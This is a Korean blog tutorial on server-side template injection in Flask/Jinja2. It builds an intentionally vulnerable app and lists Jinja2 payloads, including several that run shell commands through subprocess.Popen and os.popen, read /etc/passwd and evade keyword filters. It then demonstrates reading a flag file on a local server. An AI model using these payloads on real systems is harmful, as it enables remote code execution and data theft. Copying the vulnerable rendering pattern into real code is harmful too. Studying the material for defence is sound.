---
layout: post
title:  "SSTI(Server Side Template Injection) 취약점이란?"
tags: [SSTI]
excerpt: "SSTI(Server Side Template Injection) 취약점은 공격자가 서버측의 기본 템플릿 구문을 이용하여 악성 페이로드를 삽입 한 다음 서버 측에 실행되면서 생기는 취약점이며 웹 템플릿 엔진마다 사용되는 페이로드가 다릅니다."
---

SSTI(Server Side Template Injection) 취약점은 공격자가 서버측의 기본 템플릿 구문을 이용하여 악성 페이로드를 삽입 한 다음 서버 측에 실행되면서 생기는 취약점이며 웹 템플릿 엔진마다 사용되는 페이로드가 다릅니다.

* * *

## 웹 템플릿이란?

웹 템플릿 엔진은 웹 템플릿들과 웹 컨텐츠 정보를 처리하는 목적으로 설계된 소프트웨어를 뜻합니다.
 
__[웹 템플릿 엔진 종류](https://en.wikipedia.org/wiki/Comparison_of_web_template_engines)__

## SSTI 취약점을 이용한 템플릿 구분

![SSTI template payloads](/post-images/SSTI/SSTI-1/SSTI-template-payloads.png)

해당 사진으로 각 템플릿 엔진마다 쓰이는 구문을 다르게 하여 해당 서버에서 무슨 템플릿이 사용되는지 예측할 수 있습니다.

* * *

<br>

## SSTI 취약점 익스

확실한 이해를 돕기 위해 SSTI 취약점이 발생하는 소스코드를 만들었습니다.
확실한 이해를 돕기 위해 SSTI 취약점이 발생시킬 수 있는 소스코드를 만들어보면

<br>

### Python Flask 예제 소스코드

```py
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    if request.method == 'GET':

        payloads = request.args.get('payloads','')
        payloads = payloads if payloads else "None"

        result_template = f"""
        <!DOCTYPE html>
        <html>
            <head>
                <meta charset="utf-8">
                <title>Server Side Template Injection</title>
            </head>
            <body>
                <p>SSTI : {payloads}</p>
            </body>
        </html>
        """

        return render_template_string(result_template)

app.run(host='0.0.0.0', port=8080)
```

이렇게 render_template_string 메서드를 이용하여 템플릿을 사용하는것을 볼 수 있는데 해당 Flask의 경우 따로 사용자가 지정하지 않는 한 [Jinja2 템플릿 엔진으로](https://flask.palletsprojects.com/en/1.1.x/templating/) 작동이 됩니다.

<br>

### 웹 페이지 분석

* * *

어떠한 웹 사이트의 취약점을 발생시키기 위해서는 사이트에서 제공하는 기능들에 대해 분석해야 수월하므로

위의 소스코드를 실행시킨다음 ``localhost:8080`` 으로 접속할시에 

```py
requests.args.get('payloads', '')
```

해당 함수로 HTTP GET 방식으로 payloads 이름으로 데이터를 받게되는데 값이 존재하면 그대로 웹페이지에 반환하고 만약 값이 비어있다면 None를 반환해주게됩니다.

```py
payloads = request.args.get('payloads','')
payloads = payloads if payloads else "None"

result_template = f"""
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>Server Side Template Injection</title>
    </head>
    <body>
        <p>SSTI : {payloads}</p>
    </body>
</html>
"""
```

<br>

* * *

<br>

### 시나리오

이제 flask로 제작된 웹 서버의 모든 기능을 파악했으니 

flag.txt(민감한 정보가 들어있는 파일)을 읽는것을 목표로 페이로드를 짜보겠습니다.

<br>

### SSTI 취약점 시도

* * *

먼저 flask에서 render_template_string함수를 이용하여 html를 출력하는 과정에
payloads 데이터를 Jinja2 문법으로 ``{% raw %}{{ 7*7 }}{% endraw %}``를 넣게 되면

![flask python ssti payloads 7*7](/post-images/SSTI/SSTI-1/python-flask-run-site-77-49.png)

SSTI 취약점이 발생하게 되면서 템플릿 구문으로 인식하여 7*7를 연산한 다음 결과를 출력하는것을 볼 수 있습니다.

이처럼 템플릿 구문을 이용하여 SSTI 취약점으로 RCE(Remote Code Execution)를 발생시킬 수 있습니다.

```py
{% raw %}{{ 7*7 }}
{{ 7*'7' }}
{{ config }}
{{ config.items() }}
{{ ''.__class__ }}
{{ ''.__class__.__mro__ }}
{{ [].__class__.__base__.__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[407]('cat flag',shell=True,stdout=-1).communicate() }}
{{ request.__class__ }}
{{ request["__cl"+"ass__"] }}
{{ request["__class__"]["__base__"] }}
{{ request["__class__"]["__base__"]["__subclasses__"] }}
{{ request["__class__"]["__base__"]["__subclasses__"]["__getitem__"] }}
{{ request["__class__"]["__base__"]["__subclasses__"]["__getitem__"][287]('ls', shell=True, stdout=-1).communicate()}}
{{ request|attr("__class__") }}
{{ request|attr("__cl"+"ass__") }}
{{ (request|attr("__class__")).__mro__ }}
{{ (request|attr("__class__"))["__mro__"] }}
{{ (config|attr("__class__")).__init__.__globals__['os'].popen('cat flag').read() }}
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}{% endraw %}
```

<br>

그리고 python Jinja2 템플릿의 경우 취약점을 발생시킬 수 있는 페이로드가 많이 존재하는데

몇가지 예시로 들면 위에 있는 페이로드와 같이 ``__class__``, ``__mro__``, ``__subclasses__``, ``__globals__``, ``__init__``, ``__getitem__``등을 이용하여 명령어를 실행할 수 있는것을 볼 수 있습니다.
자세한 설명은 문서를 참고하면 좋습니다.

[Python3 Built-in Types Documentation](https://docs.python.org/ko/3/library/stdtypes.html#special-attributes)

[Python3 Data module Documentation](https://docs.python.org/ko/3/reference/datamodel.html)

<br>

시나리오대로 민감한 정보가 들어있다고 하는 서버측의 flag.txt 파일을 커멘드를 입력하여 읽기 위해

<br>

```py
{% raw %}{{ ''.__class__.__mro__[1].__subclasses__()[470] }}
SSTI: <class 'subprocess.Popen'>{% endraw %}
```

![flask Popen](/post-images/SSTI/SSTI-1/python-flask-run-site-__class__.png)

커멘드 실행 결과를 볼 수 있는 [<class 'subprocess.Popen'>](https://docs.python.org/3/library/subprocess.html#popen-constructor)를 찾은 다음

```py
{% raw %}{{ ''.__class__.__mro__[1].__subclasses__()[470]('type flag.txt',shell=True,stdout=-1).communicate() }}
SSTI: (b'FLAG{k1mmiswyz_bl0g_ssti_2XpL0it__attack}'){% endraw %}
```

> Windows 환경이므로 파일을 읽기 위해 type 명령어를 사용했지만 linux의 경우 cat , more등의 다른 명령어를 사용하면 됩니다.

``type flag.txt`` 명령어를 실행시키면

SSTI 에 나오는 결과처럼 flag.txt 파일을 읽은 결과가 나오게되면서 민감한 정보가 들어있다고 하는 파일을 읽을 수 있습니다.

<br>

* * *

### 마무리

SSTI의 경우 python 언어에서만 작동되는 것이 아닌
템플릿을 사용하는 모든 언어에서 특정 단어 필터링하지 않거나 안전하지 않은 코딩일 경우 취약점이 손쉽게 발생할 수도 있다.

이 블로그를 작성하면서 다양한 SSTI 페이로드에 관해 공부하게 되고
좀 더 알아가는 계기가 된 것 같다.

<br>

+ python Special Attributes References

    + [Python3 Special Attributes](https://docs.python.org/ko/3/library/stdtypes.html#special-attributes)

<br>

+ Jinja2 Built-in Functions References

    + [Jinja2 List Of Builtin Filters](https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-builtin-filters)

<br>

+ Jinja2 SSTI Payloads References

    + [ssti-payloads](https://github.com/payloadbox/ssti-payloads)

    + [PayloadsAllTheThings Jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2)

    + [Flask Config](https://flask.palletsprojects.com/en/1.1.x/config/)

    + [Server Side Template Injection jinja2](https://0x1.gitlab.io/web-security/Server-Side-Template-Injection/#jinja2)
